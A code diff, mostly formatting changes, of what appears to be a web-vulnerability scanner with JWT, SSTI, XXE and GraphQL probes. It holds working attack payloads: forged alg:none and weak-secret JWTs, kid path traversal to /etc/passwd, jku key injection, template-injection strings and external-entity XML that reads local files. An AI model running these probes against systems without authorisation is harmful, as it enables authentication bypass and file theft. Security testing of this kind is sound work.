@@ -38,22 +38,31 @@ async function fetchTimed(url, options = {}, timeoutMs = DEFAULT_TIMEOUT_MS) {
       headers: Object.fromEntries([...res.headers.entries()].map(([k, v]) => [k.toLowerCase(), v])),
       body,
       durationMs: Date.now() - started,
-      url
+      url,
     };
   } finally {
     clearTimeout(timer);
   }
 }
 
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 function tryJson(text) {
   if (!text) return null;
-  try { return JSON.parse(text); } catch { return null; }
+  try {
+    return JSON.parse(text);
+  } catch {
+    return null;
+  }
 }
 
 function safePath(url) {
-  try { const u = new URL(url); return u.pathname; } catch { return url; }
+  try {
+    const u = new URL(url);
+    return u.pathname;
+  } catch {
+    return url;
+  }
 }
 
 function snippetAround(body, needle, radius = 160) {
@@ -76,7 +85,9 @@ function parseJwt(token) {
     const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
     const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
     return { header, payload, signature: parts[2] || '' };
-  } catch { return null; }
+  } catch {
+    return null;
+  }
 }
 
 function signHs256(header, payload, secret) {
@@ -88,24 +99,65 @@ function signHs256(header, payload, secret) {
 
 /** Small, honest weak-secret list — real-world top offenders, no 10k-wordlist spray. */
 const WEAK_SECRETS = [
-  'secret', 'password', '123456', '12345678', 'qwerty', 'admin', 'letmein',
-  'changeme', 'jwtsecret', 'jwt_secret', 'mysecret', 'supersecret', 'topsecret',
-  'token', 'access', 'auth', 'login', 'test', 'testing', 'dev', 'development',
-  'prod', 'production', 'key', 'apikey', 'api_key', 'privatekey', 'private_key',
-  'your-256-bit-secret', 'your_256_bit_secret', 'secretkey', 'secret_key',
-  's3cr3t', 'p@ssw0rd', 'Passw0rd', 'Password1', 'hello', 'welcome', 'abc123',
-  'football', 'monkey', 'dragon', 'master', 'sunshine', 'princess', 'trustno1'
+  'secret',
+  'password',
+  '123456',
+  '12345678',
+  'qwerty',
+  'admin',
+  'letmein',
+  'changeme',
+  'jwtsecret',
+  'jwt_secret',
+  'mysecret',
+  'supersecret',
+  'topsecret',
+  'token',
+  'access',
+  'auth',
+  'login',
+  'test',
+  'testing',
+  'dev',
+  'development',
+  'prod',
+  'production',
+  'key',
+  'apikey',
+  'api_key',
+  'privatekey',
+  'private_key',
+  'your-256-bit-secret',
+  'your_256_bit_secret',
+  'secretkey',
+  'secret_key',
+  's3cr3t',
+  'p@ssw0rd',
+  'Passw0rd',
+  'Password1',
+  'hello',
+  'welcome',
+  'abc123',
+  'football',
+  'monkey',
+  'dragon',
+  'master',
+  'sunshine',
+  'princess',
+  'trustno1',
 ];
 
 function extractTokenFromResponse(res) {
   const j = tryJson(res.body);
   if (j && typeof j === 'object') {
     for (const k of ['token', 'accessToken', 'access_token', 'idToken', 'id_token', 'jwt']) {
-      if (typeof j[k] === 'string' && j[k].split('.').length >= 2) return { token: j[k], via: `json:${k}` };
+      if (typeof j[k] === 'string' && j[k].split('.').length >= 2)
+        return { token: j[k], via: `json:${k}` };
     }
     if (j.data && typeof j.data === 'object') {
       for (const k of ['token', 'accessToken', 'access_token']) {
-        if (typeof j.data[k] === 'string' && j.data[k].split('.').length >= 2) return { token: j.data[k], via: `json:data.${k}` };
+        if (typeof j.data[k] === 'string' && j.data[k].split('.').length >= 2)
+          return { token: j.data[k], via: `json:data.${k}` };
       }
     }
   }
@@ -120,9 +172,17 @@ async function startCallbackListener(tag) {
   const hits = [];
   const server = http.createServer((req, res) => {
     let body = '';
-    req.on('data', (c) => { body += c; });
+    req.on('data', c => {
+      body += c;
+    });
     req.on('end', () => {
-      hits.push({ tag, method: req.method, url: req.url, ua: req.headers['user-agent'] || '', at: Date.now() });
+      hits.push({
+        tag,
+        method: req.method,
+        url: req.url,
+        ua: req.headers['user-agent'] || '',
+        at: Date.now(),
+      });
       if (/\.json|jwks/i.test(req.url || '')) {
         res.setHeader('content-type', 'application/json');
         res.end(JSON.stringify({ keys: server._jwk ? [server._jwk] : [] }));
@@ -132,12 +192,13 @@ async function startCallbackListener(tag) {
       }
     });
   });
-  await new Promise((r) => server.listen(0, '127.0.0.1', r));
+  await new Promise(r => server.listen(0, '127.0.0.1', r));
   const port = server.address().port;
   return {
-    server, hits,
+    server,
+    hits,
     url: `http://127.0.0.1:${port}`,
-    close: () => new Promise((r) => server.close(r))
+    close: () => new Promise(r => server.close(r)),
   };
 }
 
@@ -147,9 +208,12 @@ async function findProtectedEndpoint(origin, candidates, token, timeoutMs) {
   const baseline = {};
   for (const p of candidates) {
     const url = `${origin}${p}`;
-    const anon = await fetchTimed(url, {}, timeoutMs).catch((e) => ({ error: e.message }));
-    const authed = await fetchTimed(url, { headers: { authorization: `Bearer ${token}` } }, timeoutMs)
-      .catch((e) => ({ error: e.message }));
+    const anon = await fetchTimed(url, {}, timeoutMs).catch(e => ({ error: e.message }));
+    const authed = await fetchTimed(
+      url,
+      { headers: { authorization: `Bearer ${token}` } },
+      timeoutMs
+    ).catch(e => ({ error: e.message }));
     const anonRes = { status: anon.status ?? null, body: anon.body || '' };
     baseline[url] = anonRes;
     if (!anon.error && !authed.error && [401, 403].includes(anon.status) && authed.status === 200) {
@@ -160,8 +224,11 @@ async function findProtectedEndpoint(origin, candidates, token, timeoutMs) {
   for (const p of candidates) {
     const url = `${origin}${p}`;
     const anon = baseline[url];
-    const authed = await fetchTimed(url, { headers: { authorization: `Bearer ${token}` } }, timeoutMs)
-      .catch((e) => ({ error: e.message }));
+    const authed = await fetchTimed(
+      url,
+      { headers: { authorization: `Bearer ${token}` } },
+      timeoutMs
+    ).catch(e => ({ error: e.message }));
     if (!authed.error && authed.status === 200 && anon && anon.body !== (authed.body || '')) {
       return { url, baseline: anon, authedBody: authed.body || '' };
     }
@@ -178,8 +245,12 @@ function isAccepted(res, baseline) {
 // ── Tool: jwt_attack_probe ───────────────────────────────────────────────
 
 export async function jwtProbe({
-  baseUrl, token = null, loginPath = '/api/login', loginBody = null,
-  protectedPaths = null, timeoutMs = DEFAULT_TIMEOUT_MS
+  baseUrl,
+  token = null,
+  loginPath = '/api/login',
+  loginBody = null,
+  protectedPaths = null,
+  timeoutMs = DEFAULT_TIMEOUT_MS,
 } = {}) {
   const started = Date.now();
   const origin = baseUrl.replace(/\/$/, '');
@@ -193,21 +264,40 @@ export async function jwtProbe({
     const bodies = [
       loginBody,
       { username: 'test', password: 'test' },
-      { email: 'test@example.com', password: 'test' }
+      { email: 'test@example.com', password: 'test' },
     ].filter(Boolean);
     for (const b of bodies) {
-      const res = await fetchTimed(`${origin}${loginPath}`, {
-        method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b)
-      }, timeoutMs).catch((e) => ({ error: e.message }));
+      const res = await fetchTimed(
+        `${origin}${loginPath}`,
+        {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(b),
+        },
+        timeoutMs
+      ).catch(e => ({ error: e.message }));
       const found = !res.error ? extractTokenFromResponse(res) : null;
-      checks.push({ test: 'token-acquire', loginPath, status: res.status ?? null, found: !!found, error: res.error || null });
-      if (found) { tok = found.token; tokenVia = found.via; break; }
+      checks.push({
+        test: 'token-acquire',
+        loginPath,
+        status: res.status ?? null,
+        found: !!found,
+        error: res.error || null,
+      });
+      if (found) {
+        tok = found.token;
+        tokenVia = found.via;
+        break;
+      }
     }
     if (!tok) {
       return {
-        tool: 'jwt_attack_probe', baseUrl, checks, findings,
+        tool: 'jwt_attack_probe',
+        baseUrl,
+        checks,
+        findings,
         note: 'No JWT obtainable from the login endpoint — supply `token` to run the attack tests.',
-        durationMs: Date.now() - started
+        durationMs: Date.now() - started,
       };
     }
   }
@@ -215,29 +305,56 @@ export async function jwtProbe({
   const parsed = parseJwt(tok);
   if (!parsed) {
     checks.push({ test: 'token-parse', error: 'not a JWT (expected header.payload[.signature])' });
-    return { tool: 'jwt_attack_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
+    return {
+      tool: 'jwt_attack_probe',
+      baseUrl,
+      checks,
+      findings,
+      durationMs: Date.now() - started,
+    };
   }
-  checks.push({ test: 'token-parse', alg: parsed.header.alg || '(none)', kid: parsed.header.kid || null, via: tokenVia });
+  checks.push({
+    test: 'token-parse',
+    alg: parsed.header.alg || '(none)',
+    kid: parsed.header.kid || null,
+    via: tokenVia,
+  });
 
-  const candidates = protectedPaths || ['/api/me', '/api/profile', '/api/user', '/me', '/api/account', '/api/users/me'];
+  const candidates = protectedPaths || [
+    '/api/me',
+    '/api/profile',
+    '/api/user',
+    '/me',
+    '/api/account',
+    '/api/users/me',
+  ];
   const prot = await findProtectedEndpoint(origin, candidates, tok, timeoutMs);
   if (!prot) {
     checks.push({ test: 'protected-endpoint', found: false, tried: candidates });
     return {
-      tool: 'jwt_attack_probe', baseUrl, checks, findings,
+      tool: 'jwt_attack_probe',
+      baseUrl,
+      checks,
+      findings,
       note: 'No endpoint both rejected anonymous traffic and accepted the token — mutation tests need one.',
-      durationMs: Date.now() - started
+      durationMs: Date.now() - started,
     };
   }
   checks.push({ test: 'protected-endpoint', found: true, url: prot.url });
 
-  const sendAs = (t) => fetchTimed(prot.url, { headers: { authorization: `Bearer ${t}` } }, timeoutMs)
-    .catch((e) => ({ error: e.message }));
+  const sendAs = t =>
+    fetchTimed(prot.url, { headers: { authorization: `Bearer ${t}` } }, timeoutMs).catch(e => ({
+      error: e.message,
+    }));
 
   // 2. alg:none — strip the signature entirely.
   const noneTok = `${b64urlJson({ alg: 'none', typ: 'JWT' })}.${b64urlJson(parsed.payload)}.`;
   const noneRes = await sendAs(noneTok);
-  checks.push({ test: 'none-alg', status: noneRes.status ?? null, accepted: isAccepted(noneRes, prot.baseline) });
+  checks.push({
+    test: 'none-alg',
+    status: noneRes.status ?? null,
+    accepted: isAccepted(noneRes, prot.baseline),
+  });
   if (isAccepted(noneRes, prot.baseline)) {
     findings.push({
       type: 'jwt-none-alg',
@@ -248,10 +365,10 @@ export async function jwtProbe({
         request: `GET ${safePath(prot.url)} with Authorization: Bearer <alg:none, empty signature>`,
         responseStatus: noneRes.status,
         responseSnippet: String(noneRes.body || '').slice(0, 500),
-        note: 'The server accepted an unsigned token: anyone can forge arbitrary claims (e.g. role=admin).'
+        note: 'The server accepted an unsigned token: anyone can forge arbitrary claims (e.g. role=admin).',
       },
       confidence: 0.95,
-      source: 'jwt_attack_probe'
+      source: 'jwt_attack_probe',
     });
   }
 
@@ -261,7 +378,10 @@ export async function jwtProbe({
   for (const s of WEAK_SECRETS) {
     const forged = signHs256({ alg: 'HS256', typ: 'JWT' }, tampered, s);
     const r = await sendAs(forged);
-    if (isAccepted(r, prot.baseline)) { cracked = { secret: s, response: r }; break; }
+    if (isAccepted(r, prot.baseline)) {
+      cracked = { secret: s, response: r };
+      break;
+    }
   }
   checks.push({ test: 'weak-secret', tried: WEAK_SECRETS.length, cracked: !!cracked });
   if (cracked) {
@@ -275,10 +395,10 @@ export async function jwtProbe({
         secret: cracked.secret,
         responseStatus: cracked.response.status,
         responseSnippet: String(cracked.response.body || '').slice(0, 500),
-        note: 'The HMAC secret is in a trivial guess list; an attacker can mint tokens with any claims.'
+        note: 'The HMAC secret is in a trivial guess list; an attacker can mint tokens with any claims.',
       },
       confidence: 0.95,
-      source: 'jwt_attack_probe'
+      source: 'jwt_attack_probe',
     });
   }
 
@@ -286,18 +406,26 @@ export async function jwtProbe({
   const kids = ['../../../../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/passwd'];
   for (const kid of kids) {
     const variants = [
-      { alg: 'none', typ: 'JWT', kid },                       // unsigned + traversal
-      { ...parsed.header, kid }                                // original sig + traversal
+      { alg: 'none', typ: 'JWT', kid }, // unsigned + traversal
+      { ...parsed.header, kid }, // original sig + traversal
     ];
     for (const h of variants) {
-      const t = h.alg === 'none'
-        ? `${b64urlJson(h)}.${b64urlJson(parsed.payload)}.`
-        : `${b64urlJson(h)}.${b64urlJson(parsed.payload)}.${parsed.signature}`;
+      const t =
+        h.alg === 'none'
+          ? `${b64urlJson(h)}.${b64urlJson(parsed.payload)}.`
+          : `${b64urlJson(h)}.${b64urlJson(parsed.payload)}.${parsed.signature}`;
       const r = await sendAs(t);
       const body = String(r.body || '');
-      const leaksPath = /ENOENT|no such file|open\(|readFile|include_path|failed to open/i.test(body)
-        && (body.includes(kid.replace(/\\/g, '/').split('/').pop()) || /passwd|win\.ini/i.test(body));
-      checks.push({ test: 'kid-traversal', kid, alg: h.alg, status: r.status ?? null, pathLeak: leaksPath });
+      const leaksPath =
+        /ENOENT|no such file|open\(|readFile|include_path|failed to open/i.test(body) &&
+        (body.includes(kid.replace(/\\/g, '/').split('/').pop()) || /passwd|win\.ini/i.test(body));
+      checks.push({
+        test: 'kid-traversal',
+        kid,
+        alg: h.alg,
+        status: r.status ?? null,
+        pathLeak: leaksPath,
+      });
       if (leaksPath) {
         findings.push({
           type: 'jwt-kid-traversal',
@@ -308,15 +436,15 @@ export async function jwtProbe({
             request: `GET ${safePath(prot.url)} with JWT header kid="${kid}"`,
             responseStatus: r.status,
             responseSnippet: body.slice(0, 600),
-            note: 'The error proves the kid value is resolved as a key file path — path traversal / LFI in key loading.'
+            note: 'The error proves the kid value is resolved as a key file path — path traversal / LFI in key loading.',
           },
           confidence: 0.9,
-          source: 'jwt_attack_probe'
+          source: 'jwt_attack_probe',
         });
         break;
       }
     }
-    if (findings.some((f) => f.type === 'jwt-kid-traversal')) break;
+    if (findings.some(f => f.type === 'jwt-kid-traversal')) break;
   }
 
   // 5. jku / x5u header injection — needs the TARGET to fetch our key URL back.
@@ -332,13 +460,21 @@ export async function jwtProbe({
     const jkuHeader = { alg: 'RS256', typ: 'JWT', jku: jkuUrl, kid: 'dm-attacker-key' };
     const h = b64urlJson(jkuHeader);
     const p = b64urlJson(tampered);
-    const sig = crypto.sign('sha256', Buffer.from(`${h}.${p}`), rsa.privateKey).toString('base64url');
+    const sig = crypto
+      .sign('sha256', Buffer.from(`${h}.${p}`), rsa.privateKey)
+      .toString('base64url');
     const jkuTok = `${h}.${p}.${sig}`;
     const r = await sendAs(jkuTok);
     await sleep(1500); // give the target time to fetch the JWKS
     const fetched = cb.hits.length > 0;
     const acceptedJku = isAccepted(r, prot.baseline);
-    checks.push({ test: 'jku-injection', jku: jkuUrl, serverFetchedKey: fetched, tokenAccepted: acceptedJku, status: r.status ?? null });
+    checks.push({
+      test: 'jku-injection',
+      jku: jkuUrl,
+      serverFetchedKey: fetched,
+      tokenAccepted: acceptedJku,
+      status: r.status ?? null,
+    });
     if (fetched) {
       findings.push({
         type: 'jwt-jku-key-fetch',
@@ -349,10 +485,10 @@ export async function jwtProbe({
           request: `GET ${safePath(prot.url)} with JWT header jku="${jkuUrl}"`,
           callbackHit: cb.hits[0],
           tokenAccepted: acceptedJku,
-          note: 'The server performed a server-side request to the attacker URL to load verification keys (key confusion / SSRF).'
+          note: 'The server performed a server-side request to the attacker URL to load verification keys (key confusion / SSRF).',
         },
         confidence: 0.95,
-        source: 'jwt_attack_probe'
+        source: 'jwt_attack_probe',
       });
       if (acceptedJku) {
         findings.push({
@@ -364,10 +500,10 @@ export async function jwtProbe({
             request: `GET ${safePath(prot.url)} with Authorization: Bearer <RS256, jku=${jkuUrl}, role=admin>`,
             responseStatus: r.status,
             responseSnippet: String(r.body || '').slice(0, 500),
-            note: 'Full signature bypass: the server trusts keys from the URL named in the token header.'
+            note: 'Full signature bypass: the server trusts keys from the URL named in the token header.',
           },
           confidence: 0.98,
-          source: 'jwt_attack_probe'
+          source: 'jwt_attack_probe',
         });
       }
     }
@@ -389,13 +525,19 @@ function sstiPayloads(a, b) {
     { engine: 'FreeMarker/Pug (#{ })', payload: `#\{${a}*${b}}` },
     { engine: 'ERB/EJS (<%= %>)', payload: `<%= ${a}*${b} %>` },
     { engine: 'Thymeleaf ([[${ ]]])', payload: `[[${'${'}${a}*${b}}]]` },
-    { engine: 'Smarty ({ })', payload: `{${a}*${b}}` }
+    { engine: 'Smarty ({ })', payload: `{${a}*${b}}` },
   ];
 }
 
-const SSTI_ENGINE_FINGERPRINTS = /jinja2|twig|freemarker|velocity|smarty|mustache|handlebars|\berb\b|thymeleaf|djangotemplate|tornado\.template/i;
+const SSTI_ENGINE_FINGERPRINTS =
+  /jinja2|twig|freemarker|velocity|smarty|mustache|handlebars|\berb\b|thymeleaf|djangotemplate|tornado\.template/i;
 
-export async function sstiProbe({ baseUrl, webProbe: recon = null, endpoints = null, timeoutMs = DEFAULT_TIMEOUT_MS } = {}) {
+export async function sstiProbe({
+  baseUrl,
+  webProbe: recon = null,
+  endpoints = null,
+  timeoutMs = DEFAULT_TIMEOUT_MS,
+} = {}) {
   const started = Date.now();
   const origin = baseUrl.replace(/\/$/, '');
   const checks = [];
@@ -406,20 +548,27 @@ export async function sstiProbe({ baseUrl, webProbe: recon = null, endpoints = n
   const targets = []; // {method, url, param}
   const addTarget = (method, url, param) => {
     const k = `${method} ${url} ${param}`;
-    if (!seen.has(k)) { seen.add(k); targets.push({ method, url, param }); }
+    if (!seen.has(k)) {
+      seen.add(k);
+      targets.push({ method, url, param });
+    }
   };
   if (recon) {
     for (const qp of recon.queryParams || []) {
       for (const p of qp.params) addTarget('GET', `${origin}${qp.path}`, p);
     }
     for (const f of recon.forms || []) {
-      const name = f.inputs.find((i) => i.name)?.name;
+      const name = f.inputs.find(i => i.name)?.name;
       if (name) addTarget(f.method === 'post' ? 'POST' : 'GET', f.action, name);
     }
   }
   if (endpoints) for (const e of endpoints) addTarget('GET', `${origin}${e}`, 'q');
   for (const e of ['/greet', '/hello', '/render', '/preview', '/search']) {
-    addTarget('GET', `${origin}${e}`, e === '/render' ? 'template' : e === '/preview' ? 'text' : 'name');
+    addTarget(
+      'GET',
+      `${origin}${e}`,
+      e === '/render' ? 'template' : e === '/preview' ? 'text' : 'name'
+    );
   }
 
   const a = 10000 + Math.floor(Math.random() * 89999);
@@ -431,26 +580,45 @@ export async function sstiProbe({ baseUrl, webProbe: recon = null, endpoints = n
       if (t.method === 'POST') {
         const body = {};
         body[t.param] = payload;
-        return await fetchTimed(t.url, {
-          method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams(body).toString()
-        }, timeoutMs);
+        return await fetchTimed(
+          t.url,
+          {
+            method: 'POST',
+            headers: { 'content-type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(body).toString(),
+          },
+          timeoutMs
+        );
       }
       const u = new URL(t.url, origin);
       u.searchParams.set(t.param, payload);
       return await fetchTimed(u.toString(), {}, timeoutMs);
-    } catch (e) { return { error: e.message }; }
+    } catch (e) {
+      return { error: e.message };
+    }
   };
 
   for (const t of targets.slice(0, 14)) {
     for (const { engine, payload } of sstiPayloads(a, b)) {
       const res = await sendPayload(t, payload);
       if (res.error || typeof res.body !== 'string') {
-        checks.push({ target: `${t.method} ${safePath(t.url)} [${t.param}]`, engine, error: res.error || 'no body' });
+        checks.push({
+          target: `${t.method} ${safePath(t.url)} [${t.param}]`,
+          engine,
+          error: res.error || 'no body',
+        });
         continue;
       }
-      const evaluated = res.body.includes(expected) && !res.body.includes(payload) && !res.body.includes(`${a}*${b}`);
-      checks.push({ target: `${t.method} ${safePath(t.url)} [${t.param}]`, engine, status: res.status, evaluated });
+      const evaluated =
+        res.body.includes(expected) &&
+        !res.body.includes(payload) &&
+        !res.body.includes(`${a}*${b}`);
+      checks.push({
+        target: `${t.method} ${safePath(t.url)} [${t.param}]`,
+        engine,
+        status: res.status,
+        evaluated,
+      });
       if (evaluated) {
         findings.push({
           type: 'ssti',
@@ -462,15 +630,15 @@ export async function sstiProbe({ baseUrl, webProbe: recon = null, endpoints = n
             engine,
             expectedValue: expected,
             responseSnippet: snippetAround(res.body, expected),
-            note: 'The template expression was EVALUATED server-side (computed value returned, raw payload absent) — SSTI, often RCE.'
+            note: 'The template expression was EVALUATED server-side (computed value returned, raw payload absent) — SSTI, often RCE.',
           },
           confidence: 0.93,
-          source: 'ssti_probe'
+          source: 'ssti_probe',
         });
         break; // one engine hit per injection point is enough
       }
     }
-    if (findings.some((f) => f.url === t.url)) break;
+    if (findings.some(f => f.url === t.url)) break;
   }
 
   // Engine fingerprint via a lone "{{" — error pages naming the engine.
@@ -489,10 +657,10 @@ export async function sstiProbe({ baseUrl, webProbe: recon = null, endpoints = n
           request: `${t.method} ${safePath(t.url)} ${t.param}={{`,
           engine: eng,
           responseSnippet: snippetAround(res.body, eng),
-          note: 'Error output names the template engine — narrows SSTI payload crafting for an attacker.'
+          note: 'Error output names the template engine — narrows SSTI payload crafting for an attacker.',
         },
         confidence: 0.8,
-        source: 'ssti_probe'
+        source: 'ssti_probe',
       });
     }
   }
@@ -505,7 +673,12 @@ export async function sstiProbe({ baseUrl, webProbe: recon = null, endpoints = n
 // (server resolved the external entity → SSRF), (2) file:/// content or an
 // explicit file-read error is returned.
 
-export async function xxeProbe({ baseUrl, endpoints = null, webProbe: recon = null, timeoutMs = DEFAULT_TIMEOUT_MS } = {}) {
+export async function xxeProbe({
+  baseUrl,
+  endpoints = null,
+  webProbe: recon = null,
+  timeoutMs = DEFAULT_TIMEOUT_MS,
+} = {}) {
   const started = Date.now();
   const origin = baseUrl.replace(/\/$/, '');
   const checks = [];
@@ -532,24 +705,41 @@ export async function xxeProbe({ baseUrl, endpoints = null, webProbe: recon = nu
       const payloads = [
         ['ssrf', ssrfXml, 'application/xml'],
         ['ssrf-text', ssrfXml, 'text/xml'],
-        ['file', fileXml, 'application/xml']
+        ['file', fileXml, 'application/xml'],
       ];
       for (const [label, xml, ctype] of payloads) {
         const hitsBefore = cb.hits.length;
-        const res = await fetchTimed(url, {
-          method: 'POST', headers: { 'content-type': ctype }, body: xml
-        }, timeoutMs).catch((e) => ({ error: e.message }));
-        const check = { endpoint: ep, payload: label, contentType: ctype, status: res.status ?? null, error: res.error || null };
+        const res = await fetchTimed(
+          url,
+          {
+            method: 'POST',
+            headers: { 'content-type': ctype },
+            body: xml,
+          },
+          timeoutMs
+        ).catch(e => ({ error: e.message }));
+        const check = {
+          endpoint: ep,
+          payload: label,
+          contentType: ctype,
+          status: res.status ?? null,
+          error: res.error || null,
+        };
         if (!res.error && typeof res.body === 'string') {
           const body = res.body;
           if (label.startsWith('ssrf')) {
             await sleep(1200);
             // HONESTY: only hits caused by THIS request (marker match) count —
             // a fetch from an earlier endpoint must not implicate this one.
-            const fresh = cb.hits.slice(hitsBefore).filter((h) => String(h.url || '').includes(marker));
+            const fresh = cb.hits
+              .slice(hitsBefore)
+              .filter(h => String(h.url || '').includes(marker));
             check.callbackHit = fresh.length > 0;
             // One finding per endpoint: the first proving content-type wins.
-            if (fresh.length > 0 && !findings.some((f) => f.url === url && f.type === 'xxe-external-entity')) {
+            if (
+              fresh.length > 0 &&
+              !findings.some(f => f.url === url && f.type === 'xxe-external-entity')
+            ) {
               check.callbackHitDetail = fresh[0];
               findings.push({
                 type: 'xxe-external-entity',
@@ -560,16 +750,19 @@ export async function xxeProbe({ baseUrl, endpoints = null, webProbe: recon = nu
                   request: `POST ${ep} Content-Type: ${ctype} with <!ENTITY xxe SYSTEM "${cbEntityUrl}">`,
                   callbackHit: fresh[0],
                   responseStatus: res.status,
-                  note: 'The server fetched our external-entity URL — it resolves attacker-controlled entities (SSRF, pivoting).'
+                  note: 'The server fetched our external-entity URL — it resolves attacker-controlled entities (SSRF, pivoting).',
                 },
                 confidence: 0.95,
-                source: 'xxe_probe'
+                source: 'xxe_probe',
               });
             }
           }
           if (label === 'file') {
             const fileDisclosed = /root:.*:0:0|daemon:.*:[0-9]+:[0-9]+/i.test(body);
-            const fileError = /FileNotFoundException|fopen\(|failed to open stream.*passwd|java\.io.*passwd/i.test(body);
+            const fileError =
+              /FileNotFoundException|fopen\(|failed to open stream.*passwd|java\.io.*passwd/i.test(
+                body
+              );
             check.fileDisclosed = fileDisclosed;
             check.fileError = fileError;
             if (fileDisclosed) {
@@ -581,10 +774,10 @@ export async function xxeProbe({ baseUrl, endpoints = null, webProbe: recon = nu
                 evidence: {
                   request: `POST ${ep} with <!ENTITY xxe SYSTEM "file:///etc/passwd">`,
                   responseSnippet: body.slice(0, 600),
-                  note: 'Contents of /etc/passwd were returned — arbitrary local file read via XXE.'
+                  note: 'Contents of /etc/passwd were returned — arbitrary local file read via XXE.',
                 },
                 confidence: 0.97,
-                source: 'xxe_probe'
+                source: 'xxe_probe',
               });
             } else if (fileError) {
               findings.push({
@@ -595,19 +788,22 @@ export async function xxeProbe({ baseUrl, endpoints = null, webProbe: recon = nu
                 evidence: {
                   request: `POST ${ep} with <!ENTITY xxe SYSTEM "file:///etc/passwd">`,
                   responseSnippet: body.slice(0, 600),
-                  note: 'The error proves the parser tried to open the local file — file-read primitive exists even though content was not returned.'
+                  note: 'The error proves the parser tried to open the local file — file-read primitive exists even though content was not returned.',
                 },
                 confidence: 0.85,
-                source: 'xxe_probe'
+                source: 'xxe_probe',
               });
             }
           }
         }
         checks.push(check);
       }
-      const kinds = new Set(findings.map((f) => f.type));
-      if (kinds.has('xxe-external-entity')
-          && (kinds.has('xxe-file-disclosure') || kinds.has('xxe-file-access-attempt'))) break;
+      const kinds = new Set(findings.map(f => f.type));
+      if (
+        kinds.has('xxe-external-entity') &&
+        (kinds.has('xxe-file-disclosure') || kinds.has('xxe-file-access-attempt'))
+      )
+        break;
     }
   } finally {
     await cb.close();
@@ -623,16 +819,22 @@ export async function xxeProbe({ baseUrl, endpoints = null, webProbe: recon = nu
 const GQL_PATHS = ['/graphql', '/api/graphql', '/graphiql', '/api/graphiql', '/gql', '/api/gql'];
 
 async function gqlPost(url, body, timeoutMs) {
-  return fetchTimed(url, {
-    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
-  }, timeoutMs).catch((e) => ({ error: e.message }));
+  return fetchTimed(
+    url,
+    {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify(body),
+    },
+    timeoutMs
+  ).catch(e => ({ error: e.message }));
 }
 
 function isGraphqlResponse(res) {
   if (res.error || typeof res.body !== 'string') return false;
   const j = tryJson(res.body);
   if (!j) return false;
-  if (Array.isArray(j)) return j.every((e) => e && (e.data !== undefined || e.errors !== undefined));
+  if (Array.isArray(j)) return j.every(e => e && (e.data !== undefined || e.errors !== undefined));
   return j.data !== undefined || j.errors !== undefined;
 }
 
@@ -671,10 +873,10 @@ export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_
         evidence: {
           request: `POST ${p} {"query":"{__schema{queryType{name}}}"}`,
           responseSnippet: String(intro.body || '').slice(0, 600),
-          note: 'Introspection returns the entire schema — attackers enumerate every type, field, and mutation.'
+          note: 'Introspection returns the entire schema — attackers enumerate every type, field, and mutation.',
         },
         confidence: 0.95,
-        source: 'graphql_probe'
+        source: 'graphql_probe',
       });
     } else {
       checks.push({ ...ep, test: 'introspection', enabled: false });
@@ -684,7 +886,8 @@ export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_
     const badField = `zzzNoSuchField${Date.now().toString(36)}`;
     const sug = await gqlPost(url, { query: `{${badField}}` }, timeoutMs);
     const sj = tryJson(sug.body);
-    const sugMsg = sj && Array.isArray(sj.errors) ? sj.errors.map((e) => e.message || '').join(' ') : '';
+    const sugMsg =
+      sj && Array.isArray(sj.errors) ? sj.errors.map(e => e.message || '').join(' ') : '';
     const suggests = /did you mean|suggestion|did you forget/i.test(sugMsg) && /".*"/.test(sugMsg);
     checks.push({ ...ep, test: 'field-suggestion', suggests, status: sug.status ?? null });
     if (suggests) {
@@ -697,17 +900,24 @@ export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_
           request: `POST ${p} {"query":"{${badField}}"}`,
           suggestion: sugMsg.slice(0, 300),
           responseSnippet: String(sug.body || '').slice(0, 600),
-          note: 'Error messages suggest valid field names — schema enumeration without introspection.'
+          note: 'Error messages suggest valid field names — schema enumeration without introspection.',
         },
         confidence: 0.85,
-        source: 'graphql_probe'
+        source: 'graphql_probe',
       });
     }
 
     // 3. Query batching?
-    const batch = await gqlPost(url, Array.from({ length: 5 }, () => ({ query: '{__typename}' })), timeoutMs);
+    const batch = await gqlPost(
+      url,
+      Array.from({ length: 5 }, () => ({ query: '{__typename}' })),
+      timeoutMs
+    );
     const bj = tryJson(batch.body);
-    const batched = Array.isArray(bj) && bj.length === 5 && bj.every((e) => e && (e.data !== undefined || e.errors !== undefined));
+    const batched =
+      Array.isArray(bj) &&
+      bj.length === 5 &&
+      bj.every(e => e && (e.data !== undefined || e.errors !== undefined));
     checks.push({ ...ep, test: 'batching', enabled: batched, status: batch.status ?? null });
     if (batched) {
       findings.push({
@@ -718,15 +928,19 @@ export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_
         evidence: {
           request: `POST ${p} [5 × {"query":"{__typename}"}]`,
           responseSnippet: String(batch.body || '').slice(0, 600),
-          note: 'The server executed all 5 batched queries in one request — enables credential-stuffing and query-complexity DoS.'
+          note: 'The server executed all 5 batched queries in one request — enables credential-stuffing and query-complexity DoS.',
         },
         confidence: 0.9,
-        source: 'graphql_probe'
+        source: 'graphql_probe',
       });
     }
 
     // 4. GET-based queries (CSRF-able)?
-    const getQ = await fetchTimed(`${url}?query=${encodeURIComponent('{__typename}')}`, {}, timeoutMs).catch((e) => ({ error: e.message }));
+    const getQ = await fetchTimed(
+      `${url}?query=${encodeURIComponent('{__typename}')}`,
+      {},
+      timeoutMs
+    ).catch(e => ({ error: e.message }));
     const getWorks = isGraphqlResponse(getQ);
     checks.push({ ...ep, test: 'get-queries', works: getWorks, status: getQ.status ?? null });
     if (getWorks) {
